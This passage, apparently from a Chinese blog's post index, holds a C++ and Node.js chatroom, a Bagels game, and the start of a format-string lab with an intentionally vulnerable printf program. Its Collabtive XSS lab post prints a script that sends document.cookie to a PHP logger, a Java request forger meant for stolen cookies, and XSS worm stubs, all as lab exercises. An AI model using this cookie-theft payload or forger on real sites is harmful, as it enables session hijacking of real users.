&#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868; list&lt;int&gt; clients_list;};#endif //CHATROOM_SERVER_H client.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#include &lt;iostream&gt;#include &quot;Client.h&quot;using namespace std;// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;Client::Client(){ // &#x521D;&#x59CB;&#x5316;&#x8981;&#x8FDE;&#x63A5;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3; serverAddr.sin_family = PF_INET; serverAddr.sin_port = htons(SERVER_PORT); serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP); // &#x521D;&#x59CB;&#x5316;socket sock = 0; // &#x521D;&#x59CB;&#x5316;&#x8FDB;&#x7A0B;&#x53F7; pid = 0; // &#x5BA2;&#x6237;&#x7AEF;&#x72B6;&#x6001; isClientwork = true; // epool fd epfd = 0;}// &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;void Client::Connect() { cout &lt;&lt; &quot;Connect Server: &quot; &lt;&lt; SERVER_IP &lt;&lt; &quot; : &quot; &lt;&lt; SERVER_PORT &lt;&lt; endl; // &#x521B;&#x5EFA;socket sock = socket(PF_INET, SOCK_STREAM, 0); if(sock &lt; 0) { perror(&quot;sock error&quot;); exit(-1); } // &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x7AEF; if(connect(sock, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr)) &lt; 0) { perror(&quot;connect error&quot;); exit(-1); } // &#x521B;&#x5EFA;&#x7BA1;&#x9053;&#xFF0C;&#x5176;&#x4E2D;fd[0]&#x7528;&#x4E8E;&#x7236;&#x8FDB;&#x7A0B;&#x8BFB;&#xFF0C;fd[1]&#x7528;&#x4E8E;&#x5B50;&#x8FDB;&#x7A0B;&#x5199; if(pipe(pipe_fd) &lt; 0) { perror(&quot;pipe error&quot;); exit(-1); } // &#x521B;&#x5EFA;epoll epfd = epoll_create(EPOLL_SIZE); if(epfd &lt; 0) { perror(&quot;epfd error&quot;); exit(-1); } //&#x5C06;sock&#x548C;&#x7BA1;&#x9053;&#x8BFB;&#x7AEF;&#x63CF;&#x8FF0;&#x7B26;&#x90FD;&#x6DFB;&#x52A0;&#x5230;&#x5185;&#x6838;&#x4E8B;&#x4EF6;&#x8868;&#x4E2D; addfd(epfd, sock, true); addfd(epfd, pipe_fd[0], true);}// &#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x6E05;&#x7406;&#x5E76;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;void Client::Close() { if(pid){ //&#x5173;&#x95ED;&#x7236;&#x8FDB;&#x7A0B;&#x7684;&#x7BA1;&#x9053;&#x548C;sock close(pipe_fd[0]); close(sock); }else{ //&#x5173;&#x95ED;&#x5B50;&#x8FDB;&#x7A0B;&#x7684;&#x7BA1;&#x9053; close(pipe_fd[1]); }}// &#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;void Client::Start() { // epoll &#x4E8B;&#x4EF6;&#x961F;&#x5217; static struct epoll_event events[2]; // &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668; Connect(); // &#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B; pid = fork(); // &#x5982;&#x679C;&#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B;&#x5931;&#x8D25;&#x5219;&#x9000;&#x51FA; if(pid &lt; 0) { perror(&quot;fork error&quot;); close(sock); exit(-1); } else if(pid == 0) { // &#x8FDB;&#x5165;&#x5B50;&#x8FDB;&#x7A0B;&#x6267;&#x884C;&#x6D41;&#x7A0B; //&#x5B50;&#x8FDB;&#x7A0B;&#x8D1F;&#x8D23;&#x5199;&#x5165;&#x7BA1;&#x9053;&#xFF0C;&#x56E0;&#x6B64;&#x5148;&#x5173;&#x95ED;&#x8BFB;&#x7AEF; close(pipe_fd[0]); // &#x8F93;&#x5165;exit&#x53EF;&#x4EE5;&#x9000;&#x51FA;&#x804A;&#x5929;&#x5BA4; cout &lt;&lt; &quot;Please input &apos;exit&apos; to exit the chat room&quot; &lt;&lt; endl; // &#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8FD0;&#x884C;&#x6B63;&#x5E38;&#x5219;&#x4E0D;&#x65AD;&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF; while(isClientwork){ bzero(&amp;message, BUF_SIZE); fgets(message, BUF_SIZE, stdin); // &#x5BA2;&#x6237;&#x8F93;&#x51FA;exit,&#x9000;&#x51FA; if(strncasecmp(message, EXIT, strlen(EXIT)) == 0){ isClientwork = 0; } // &#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x7BA1;&#x9053; else { if( write(pipe_fd[1], message, strlen(message) - 1 ) &lt; 0 ) { perror(&quot;fork error&quot;); exit(-1); } } } } else { //pid &gt; 0 &#x7236;&#x8FDB;&#x7A0B; //&#x7236;&#x8FDB;&#x7A0B;&#x8D1F;&#x8D23;&#x8BFB;&#x7BA1;&#x9053;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x5148;&#x5173;&#x95ED;&#x5199;&#x7AEF; close(pipe_fd[1]); // &#x4E3B;&#x5FAA;&#x73AF;(epoll_wait) while(isClientwork) { int epoll_events_count = epoll_wait( epfd, events, 2, -1 ); //&#x5904;&#x7406;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6; for(int i = 0; i &lt; epoll_events_count ; ++i) { bzero(&amp;message, BUF_SIZE); //&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x6765;&#x6D88;&#x606F; if(events[i].data.fd == sock) { //&#x63A5;&#x53D7;&#x670D;&#x52A1;&#x7AEF;&#x6D88;&#x606F; int ret = recv(sock, message, BUF_SIZE, 0); // ret= 0 &#x670D;&#x52A1;&#x7AEF;&#x5173;&#x95ED; if(ret == 0) { cout &lt;&lt; &quot;Server closed connection: &quot; &lt;&lt; sock &lt;&lt; endl; close(sock); isClientwork = 0; } else { cout &lt;&lt; message &lt;&lt; endl; } } //&#x5B50;&#x8FDB;&#x7A0B;&#x5199;&#x5165;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#xFF0C;&#x7236;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x5E76;&#x53D1;&#x9001;&#x670D;&#x52A1;&#x7AEF; else { //&#x7236;&#x8FDB;&#x7A0B;&#x4ECE;&#x7BA1;&#x9053;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E; int ret = read(events[i].data.fd, message, BUF_SIZE); // ret = 0 if(ret == 0) isClientwork = 0; else { // &#x5C06;&#x4FE1;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF; send(sock, message, BUF_SIZE, 0); } } }//for }//while } // &#x9000;&#x51FA;&#x8FDB;&#x7A0B; Close();} client.h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#ifndef CHATROOM_CLIENT_H#define CHATROOM_CLIENT_H#include &lt;string&gt;#include &quot;Common.h&quot;using namespace std;// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#xFF0C;&#x7528;&#x6765;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x6D88;&#x606F;class Client {public: // &#x65E0;&#x53C2;&#x6570;&#x6784;&#x9020;&#x51FD;&#x6570; Client(); // &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668; void Connect(); // &#x65AD;&#x5F00;&#x8FDE;&#x63A5; void Close(); // &#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF; void Start();private: // &#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x521B;&#x5EFA;&#x7684;socket int sock; // &#x5F53;&#x524D;&#x8FDB;&#x7A0B;ID int pid; // epoll_create&#x521B;&#x5EFA;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C; int epfd; // &#x521B;&#x5EFA;&#x7BA1;&#x9053;&#xFF0C;&#x5176;&#x4E2D;fd[0]&#x7528;&#x4E8E;&#x7236;&#x8FDB;&#x7A0B;&#x8BFB;&#xFF0C;fd[1]&#x7528;&#x4E8E;&#x5B50;&#x8FDB;&#x7A0B;&#x5199; int pipe_fd[2]; // &#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C; bool isClientwork; // &#x804A;&#x5929;&#x4FE1;&#x606F;&#x7F13;&#x51B2;&#x533A; char message[BUF_SIZE]; //&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x7684;&#x670D;&#x52A1;&#x5668; IP + port struct sockaddr_in serverAddr;};#endif //CHATROOM_CLIENT_H clientMain.cpp123456789#include &quot;Server.h&quot;// &#x670D;&#x52A1;&#x7AEF;&#x4E3B;&#x51FD;&#x6570;// &#x521B;&#x5EFA;&#x670D;&#x52A1;&#x7AEF;&#x5BF9;&#x8C61;&#x540E;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF;int main(int argc, char *argv[]) { Server server; server.Start(); return 0;} Makefile123456789101112131415CC = g++CFLAGS = -std=c++11all: ClientMain.cpp ServerMain.cpp Server.o Client.o $(CC) $(CFLAGS) ServerMain.cpp Server.o -o chatroom_server $(CC) $(CFLAGS) ClientMain.cpp Client.o -o chatroom_clientServer.o: Server.cpp Server.h Common.h $(CC) $(CFLAGS) -c Server.cppClient.o: Client.cpp Client.h Common.h $(CC) $(CFLAGS) -c Client.cppclean: rm -f *.o chatroom_server chatroom_client &#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;server: client 1: client 2: &#x505A;&#x7684;&#x65F6;&#x5019;&#x7A81;&#x7136;&#x60F3;&#x5230;&#x4E86;&#x4EE5;&#x524D;&#x505A;&#x8FC7;&#x7684;&#x4E00;&#x4E2A;&#x548C;&#x8FD9;&#x4E2A;&#x5F88;&#x76F8;&#x4F3C;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x4E0A;&#x6B21;&#x505A;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;node js&#x6765;&#x505A;&#x7684;&#x8FD9;&#x6B21;&#x4F7F;&#x7528;c++&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002; index.html1234567891011121314151617181920212223242526272829303132333435363738&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;style&gt; * { margin: 0; padding: 0; box-sizing: border-box; } body { font: 13px Helvetica, Arial; } form { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; } form input { border: 0; padding: 10px; width: 90%; margin-right: .5%; } form button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; } #messages { list-style-type: none; margin: 0; padding: 0; } #messages li { padding: 5px 10px; } #messages li:nth-child(odd) { background: #eee; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;ul id=&quot;messages&quot;&gt;&lt;/ul&gt; &lt;form action=&quot;&quot;&gt; &lt;input id=&quot;m&quot; autocomplete=&quot;off&quot; /&gt;&lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://code.jquery.com/jquery-1.11.1.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function () { var socket = io(); $(&apos;form&apos;).submit(function(){ socket.emit(&apos;chat message&apos;, $(&apos;#m&apos;).val()); $(&apos;#m&apos;).val(&apos;&apos;); return false; }); socket.on(&apos;chat message&apos;, function(msg){ $(&apos;#messages&apos;).append($(&apos;&lt;li&gt;&apos;).text(msg)); }); }); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; index.js12345678910111213141516171819202122232425var app = require(&apos;express&apos;)();var http = require(&apos;http&apos;).Server(app);var io = require(&apos;socket.io&apos;)(http);app.get(&apos;/&apos;, function(req, res){ res.sendFile(__dirname + &apos;/index.html&apos;);});io.on(&apos;connection&apos;, function(socket){ socket.broadcast.emit(&apos;hi&apos;); console.log(&apos;a user connected&apos;); socket.on(&apos;disconnect&apos;, function(){ console.log(&apos;user disconnected&apos;); }); socket.on(&apos;chat message&apos;, function(msg){ console.log(&apos;message: &apos; + msg); io.emit(&apos;chat message&apos;, msg); });});io.emit(&apos;some event&apos;, {for: &apos;everyone&apos;});http.listen(3000, function(){ console.log(&apos;listening on 127.0.0.1:3000&apos;);}); package.json123456{ &quot;name&quot;: &quot;socket-chat-example&quot;, &quot;version&quot;: &quot;0.0.1&quot;, &quot;description&quot;: &quot;my first socket.io app&quot;, &quot;dependencies&quot;: {}} &#x8BB0;&#x5F97;&#x5B89;&#x88C5;&#x8FD9;&#x4E24;&#x4E2A;&#x6A21;&#x5757;&#xFF1A; npm install &#x2013;save express@4.15.2 npm install &#x2013;save socket.io document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>c++</category>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Collabtive and XSS]]></title>
    <url>%2F2018%2F10%2F04%2FXSS%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146sudo vim /etc/hostssudo vim /etc/apache2/conf.d/lab.conf&lt;VirtualHost *&gt;ServerName http://www.xsslabcollabtive.comDocumentRoot /var/www/XSS/Collabtive/&lt;/VirtualHost&gt;sudo service apache2 startsudo mysqld_safecd /var/www/XSS/Collabtive/sudo vim js.html&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;sudo vim myscript.jsalert(&apos;xss&apos;);sudo vim include.html&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xsslabcollabtive.com/myscript.js&quot;&gt;&lt;/script&gt;sudo vim /var/www/XSS/Collabtive/manageuser.phpsudo vim hack.phpsudo vim hack.php&lt;?php$cookie = $_GET[&apos;c&apos;];$log = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);fwrite($log,$cookie .&quot;\n&quot;);fclose($log);?&gt;shiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ touch cookie.txtshiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ sudo chmod 777 cookie.txtecho &quot;&lt;script&gt;document.write(&apos;&lt;img src=http://www.xsslabcollabtive.com/hack.php?c=&apos; + escape(document.cookie) + &apos;&gt;&apos;);&lt;/script&gt;&quot;;&#x53D7;&#x5BB3;&#x8005;&#x8BBF;&#x95EE; www.xsslabcollabtive.com/manageuser.php &#x9875;&#x9762;&#xFF1A;cd /home/shiyanlouwget http://labfile.oss.aliyuncs.com/courses/304/live_http_headers.xpiinstall Live HTTP headers tool in firefoximport java.io.*;import java.net.*;public class HTTPSimpleForge {public static void main(String[] args) throws IOException {try {int responseCode;InputStream responseIn=null;// URL to be forged.URL url = new URL (&quot;http://www.xsslabcollabtive.com/admin.php?action=addpro&quot;);// URLConnection instance is created to further parameterize a// resource request past what the state members of URL instance// can represent.URLConnection urlConn = url.openConnection();if (urlConn instanceof HttpURLConnection) {urlConn.setConnectTimeout(60000);urlConn.setReadTimeout(90000);}// addRequestProperty method is used to add HTTP Header Information.// Here we add User-Agent HTTP header to the forged HTTP packet.// Add other necessary HTTP Headers yourself. Cookies should be stolen// using the method in task3.urlConn.addRequestProperty(&quot;User-agent&quot;,&quot;Sun JDK 1.6&quot;);//HTTP Post Data which includes the information to be sent to the server.String data=&quot;name=test&amp;desc=test...&amp;assignto[]=...&amp;assignme=1&quot;;// DoOutput flag of URL Connection should be set to true// to send HTTP POST message.urlConn.setDoOutput(true);// OutputStreamWriter is used to write the HTTP POST data// to the url connection.OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());wr.write(data);wr.flush();// HttpURLConnection a subclass of URLConnection is returned by// url.openConnection() since the url is an http request.if (urlConn instanceof HttpURLConnection) {HttpURLConnection httpConn = (HttpURLConnection) urlConn;// Contacts the web server and gets the status code from// HTTP Response message.responseCode = httpConn.getResponseCode();System.out.println(&quot;Response Code = &quot; + responseCode);// HTTP status code HTTP_OK means the response was// received sucessfully.if (responseCode == HttpURLConnection.HTTP_OK) {//Laboratory for Computer Security Education 6// Get the input stream from url connection object.responseIn = urlConn.getInputStream();// Create an instance for BufferedReader// to read the response line by line.BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));String inputLine;while((inputLine = buf_inp.readLine())!=null) {System.out.println(inputLine);}}}} catch (MalformedURLException e) {e.printStackTrace();}}}--------------------XSS&#x8815;&#x866B;sudo vim test.jssudo vim test1.jsvar on=new Ajax.PeriodicalUpdater(&quot;onlinelist&quot;,&quot;manageuser.php?action=onlinelist&quot;,//&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x65B0;&#x7684;Ajax.PeriodicalUpdater{method:&apos;get&apos;,onSuccess:function(transport){alert(transport.responseText);},frequence:1000}//&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x4E3A;get&#xFF0C;&#x9891;&#x7387;&#x4E3A;1000&#x81EA;&#x52A8;&#x4F20;&#x64AD;&#x7684;&#x8815;&#x866B;&#xFF1A;sudo vim xss_worm.jsvar strCode = document.getElementById(&quot;worm&quot;);alert(strCode.innerHTML);&#x8C03;&#x7528;&#x8815;&#x866B;&#xFF1A;sudo vim worm.html&lt;script type=&apos;text/javascript&apos; src=&apos;http://www.xsslabcollabtive.com/xss_worm.js&apos;&gt;&lt;/script&gt;-------------------------XSS&#x9632;&#x5FA1;sudo vim /var/www/XSS/Collabtive/include/initfunctions.php &#x6211;&#x8FD9;&#x91CC;&#x53EA;&#x8BB0;&#x5F55;&#x7684;&#x6574;&#x4E2A;&#x5B9E;&#x9A8C;&#x7684;&#x5927;&#x81F4;&#x8FC7;&#x7A0B;&#xFF0C;&#x8981;&#x60F3;&#x8981;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#xFF0C;&#x8BF7;&#x5230;&#x5B9E;&#x9A8C;&#x697C;&#x5B98;&#x7F51;&#x5B66;&#x4E60;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>secrity</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bagels]]></title>
    <url>%2F2018%2F10%2F03%2FBagels%2F</url>
    <content type="text"><![CDATA[python code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8import randomNUM_DIGITS = 3MAX_GUESS = 10def getSecretNum(): # &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7531; NUM_DIGITS &#x4E2A;&#x4E0D;&#x91CD;&#x590D;&#x968F;&#x673A;&#x6570;&#x7EC4;&#x6210;&#x7684;&#x5B57;&#x7B26;&#x4E32; numbers = list(range(10)) random.shuffle(numbers) secretNum = &apos;&apos; for i in range(NUM_DIGITS): secretNum += str(numbers[i]) return secretNumdef getClues(guess, secretNum): # &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7531; Pico, Fermi &#x548C; Bagels &#x7EC4;&#x6210;&#x7684;&#xFF0C;&#x7528;&#x6765;&#x63D0;&#x793A;&#x7528;&#x6237;&#x7684;&#x5B57;&#x7B26;&#x4E32; if guess == secretNum: return &apos;You got it!&apos; clues = [] for i in range(len(guess)): if guess[i] == secretNum[i]: clues.append(&apos;Fermi&apos;) elif guess[i] in secretNum: clues.append(&apos;Pico&apos;) if len(clues) == 0: return &apos;Bagels&apos; clues.sort() return &apos; &apos;.join(clues)def isOnlyDigits(num): # &#x5982;&#x679C;&#x5B57;&#x7B26;&#x4E32;&#x53EA;&#x5305;&#x542B;&#x6570;&#x5B57;&#xFF0C;&#x8FD4;&#x56DE;&#x771F;&#x3002;&#x5426;&#x5219;&#x8FD4;&#x56DE;&#x5047; if num == &apos;&apos;: return False for i in num: if i not in &apos;0 1 2 3 4 5 6 7 8 9&apos;.split(): return False return Trueprint(&apos;I am thinking of a %s-digit number. Try to guess what it is.&apos; % (NUM_DIGITS))print(&apos;The clues I give are...&apos;)print(&apos;When I say: That means:&apos;)print(&apos; Bagels None of the digits is correct.&apos;)print(&apos; Pico One digit is correct but in the wrong position.&apos;)print(&apos; Fermi One digit is correct and in the right position.&apos;)while True: secretNum = getSecretNum() print(&apos;I have thought up a number. You have %s guesses to get it.&apos; % (MAX_GUESS)) guessesTaken = 1 while guessesTaken &lt;= MAX_GUESS: guess = &apos;&apos; while len(guess) != NUM_DIGITS or not isOnlyDigits(guess): print(&apos;Guess #%s: &apos; % (guessesTaken)) guess = input() print(getClues(guess, secretNum)) guessesTaken += 1 if guess == secretNum: break if guessesTaken &gt; MAX_GUESS: print(&apos;You ran out of guesses. The answer was %s.&apos; % (secretNum)) print(&apos;Do you want to play again? (yes or no)&apos;) if not input().lower().startswith(&apos;y&apos;): break &#x81EA;&#x5DF1;&#x53C8;&#x52A8;&#x624B;&#x5199;&#x4E86;&#x4E00;&#x4E2A;C++&#x7248;&#x7684; c++ code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;ctime&gt;#include &lt;cstdlib&gt;#include &lt;set&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;const int num_digits = 3;const int count_nums = 10;int match;using namespace std;string getNum() { string str; while (1) { bool flag = true; cin &gt;&gt; str; if (str.length() != num_digits) { cout &lt;&lt; &quot;your input format error!&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Please input a &quot; &lt;&lt; num_digits &lt;&lt; &quot;digits number.&quot; &lt;&lt; endl; continue; } for (int i = 0; i &lt; str.length(); ++i) { if (str[i] &lt; &apos;0&apos; || str[i] &gt; &apos;9&apos;) { cout &lt;&lt; &quot;your input format error!&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Please input a &quot; &lt;&lt; num_digits &lt;&lt; &quot;digits number.&quot; &lt;&lt; endl; flag = false; break; } } if (flag) return str; }}string getGoalNum() { set&lt;int&gt; s; srand(time(NULL)); while (s.size() != num_digits) { int random_number = std::rand() % 10; if (s.size() == num_digits-1 &amp;&amp; random_number == 0) continue; s.insert(random_number); } string goal_num = &quot;&quot;; set&lt;int&gt;::iterator it; for (it = s.begin(); it != s.end(); ++it) { goal_num = to_string(*it) + goal_num; } s.clear(); return goal_num;}void cmp(string guess_num, string goal_num) { int len1 = guess_num.length(); int len2 = goal_num.length(); string str1 = guess_num; string str2 = goal_num; bool flag; match = 0; vector&lt;string&gt; v; for (int i = 0; i &lt; len1; ++i) { flag = true; for (int j = 0; j &lt; len2; ++j) { if (i == j &amp;&amp; str1[i] == str2[j]) { v.push_back(&quot;Fermi&quot;); flag = false; break; } else if (str1[i] == str2[j]) { v.push_back(&quot;Pico&quot;); flag = false; break; } } if (flag) { v.push_back(&quot;Bagels&quot;); } } sort(v.begin(), v.end()); for (int i = 0; i &lt; v.size(); ++i) { cout &lt;&lt; v[i] &lt;&lt; &quot; &quot;; if (v[i] == &quot;Fermi&quot;) match++; } cout &lt;&lt; endl; if (match == num_digits) cout &lt;&lt; &quot;You get it!!!&quot; &lt;&lt; endl; else cout &lt;&lt; endl; v.clear();}void init() { cout &lt;&lt; &quot;I am thinking of a &quot; &lt;&lt; num_digits &lt;&lt; &quot;-digit number. Try to guess what it is.&quot; &lt;&lt; endl; cout &lt;&lt; &quot;The clues I give are...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;When I say: That means:&quot; &lt;&lt; endl; cout &lt;&lt; &quot; Bagels None of the digits is correct.&quot; &lt;&lt; endl; cout &lt;&lt; &quot; Pico One digit is correct but in the wrong position.&quot; &lt;&lt; endl; cout &lt;&lt; &quot; Fermi One digit is correct and in the right position.&quot; &lt;&lt; endl;}int main() { string try_again; init(); while (1) { int times = count_nums; string goal_num = getGoalNum(); cout &lt;&lt; &quot;goal_num&quot; &lt;&lt; goal_num &lt;&lt; endl; while (times--) { cout &lt;&lt; &quot;Case #&quot; &lt;&lt; times &lt;&lt; &quot;:&quot; &lt;&lt; endl; string guess_num = getNum(); cmp(guess_num, goal_num); if (match == num_digits) break; } if (times == -1 &amp;&amp; match != num_digits) { cout &lt;&lt; &quot;You fail!!!&quot; &lt;&lt; endl; cout &lt;&lt; &quot;The answer is &quot; &lt;&lt; goal_num &lt;&lt; endl; } cout &lt;&lt; &quot;Do you want to try again?(yes/y): &quot;; cin &gt;&gt; try_again; if (try_again[0] == &apos;y&apos; || try_again[0] == &apos;Y&apos;) { cout &lt;&lt; &quot;Begin a new game:&quot; &lt;&lt; endl; continue; } else break; } return 0;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>c++</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c++</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Format string vulnerability experiment]]></title>
    <url>%2F2018%2F10%2F03%2FFormat-string-vulnerability-experiment%2F</url>
    <content type="text"><![CDATA[code:123456789101112131415161718192021222324252627282930313233343536373839/* vul_prog.c */ #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#define SECRET1 0x44#define SECRET2 0x55int main(int argc, char *argv[]){ char user_input[100]; int *secret; long int_input; int a, b, c, d; /* other variables, not used here.*/ /* The secret value is stored on the heap */ secret = (int *) malloc(2*sizeof(int)); /* getting the secret */ secret[0] = SECRET1; secret[1] = SECRET2; printf(&quot;The variable secret&apos;s address is 0x%8x (on stack)\n&quot;, &amp;secret); printf(&quot;The variable secret&apos;s value is 0x%8x (on heap)\n&quot;, secret); printf(&quot;secret[0]&apos;s address is 0x%8x (on heap)\n&quot;, &amp;secret[0]); printf(&quot;secret[1]&apos;s address is 0x%8x (on heap)\n&quot;, &amp;secret[1]); printf(&quot;Please enter a decimal integer\n&quot;); scanf(&quot;%d&quot;, &amp;int_input); /* getting an input from user */ printf(&quot;Please enter a string\n&quot;); scanf(&quot;%s&quot;, user_input); /* getting a string from user */ /* Vulnerable place */ printf(user_input); printf(&quot;\n&quot;); /* Verify whether your attack is successful */ printf(&quot;The original secrets: 0x%x -- 0x%x\n&quot;, SECRET1, SECRET2); printf(&quot;The new secrets: 0x%x -- 0x%x\n&quot;, secret[0], secret[1]); return 0;} &#x5728;&#x505A;&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F53;&#x6211;&#x51C6;&#x5907;&#x5BFB;&#x627E;secret[1]&#x7684;&#x5730;&#x5740;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6309;&#x7167;&#x6559;&#x7A0B;&#x5E94;&#x8BE5;&#x5E94;&#x8BE5;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x7684;&#x7ED3;&#x679C;&#x4F46;&#x662F;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x548C;&#x4ED6;&#x7684;&#x597D;&#x50CF;&#x4E0D;&#x592A;&#x4E00;&#x6837;&#xFF1A; &#x6211;&#x7684;&#x7ED3;&#x679C;&#xFF1A; 